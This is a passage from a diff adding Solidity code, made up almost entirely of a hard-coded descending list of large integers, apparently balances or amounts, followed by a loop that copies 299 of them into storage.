+        4745111741206053,
+        4567500000000000,
+        4566718533858847,
+        4521741799500376,
+        4291046880575414,
+        3956672799000000,
+        3383006600000002,
+        3314605959752808,
+        3217622841435834,
+        3087050194596413,
+        2924955641660847,
+        2870000000000000,
+        2590000000000000,
+        2336774572334112,
+        2164212667849930,
+        2041968995869530,
+        2029800067980171,
+        2000000000000000,
+        1977609209745373,
+        1744369902173807,
+        1685032546749159,
+        1646040471450838,
+        1533548589950731,
+        1443725187523367,
+        1399297384304563,
+        1379744000000000,
+        1314770345470601,
+        1305974772122529,
+        1256704068881703,
+        1131185898918675,
+        1070124763424381,
+        1035271669945904,
+        1018343500000000,
+        942028536552307,
+        930920360029028,
+        910000002000000,
+        855328203448416,
+        845697981282533,
+        837000000000000,
+        755573890303997,
+        572306037359474,
+        565000000000000,
+        546100596862389,
+        540163758383908,
+        531430808178414,
+        530370570000020,
+        510565431933205,
+        472969191295158,
+        451212685742933,
+        446861208820337,
+        446007903465158,
+        441000000000000,
+        436105824152623,
+        435536253401506,
+        433494269142722,
+        431175470351032,
+        429644499968443,
+        409449883629405,
+        386125964919897,
+        305803345432064,
+        302099607282975,
+        282585899158428,
+        281980189454303,
+        269378035643208,
+        254239812519949,
+        228974463735156,
+        199837363135573,
+        194196926835451,
+        193365544821790,
+        132329570000000,
+        116444100993429,
+        96152618565543,
+        96047375493952,
+        95225011524566,
+        95208149643831,
+        94474343125000,
+        89529811928036,
+        89500000000000,
+        86387673523956,
+        85508837713185,
+        79902000000000,
+        79408476034394,
+        79019700000010,
+        76396535731442,
+        75000000000000,
+        64589002447970,
+        64000000000000,
+        62085213048751,
+        59276027046268,
+        58122614257263,
+        54720777277697,
+        52708943900901,
+        48914904388674,
+        48617457312304,
+        48198908907373,
+        48127193179405,
+        33246080693965,
+        29000000000000,
+        25600000000000,
+        23840373362510,
+        21927249424504,
+        21306899434467,
+        17313274282909,
+        17035785601782,
+        15663674232244,
+        14230850897371,
+        13324967232865,
+        9820000000000,
+        9197992024528,
+        8826332000000,
+        8122635341645,
+        7282250326350,
+        7026747943803,
+        6875184657109,
+        4755779076540,
+        4619300673183,
+        2504057215686,
+        2000000000000,
+        1940876601279,
+        1625216226242,
+        1418459069115,
+        974142333760,
+        941200000000,
+        923951477499,
+        900000000000,
+        883199099986,
+        869380417215,
+        813372665697,
+        733922878423,
+        732000000000,
+        671754151503,
+        637340492530,
+        574812839599,
+        568018738913,
+        556255274651,
+        500000000000,
+        455983758048,
+        371403671229,
+        364141979631,
+        286539996735,
+        275578964058,
+        197398238368,
+        167164108271,
+        166528750000,
+        163994742533,
+        150000000000,
+        104178744014,
+        47184123981,
+        14682230609,
+        9816894149,
+        9463247201,
+        7631977233,
+        485821469,
+        439095941,
+        410027885,
+        98942368,
+        92266148,
+        26394076,
+        8072,
+        989,
+        21,
+        9,
+        5,
+        3,
+        3,
+        2,
+        1,
+        1,
+        1,
+        1,
+        1,
+        1,
+        1
+        ];
+        for (uint256 i = 0; i < 299; i++) m[i] = a[i];
+    }
+}
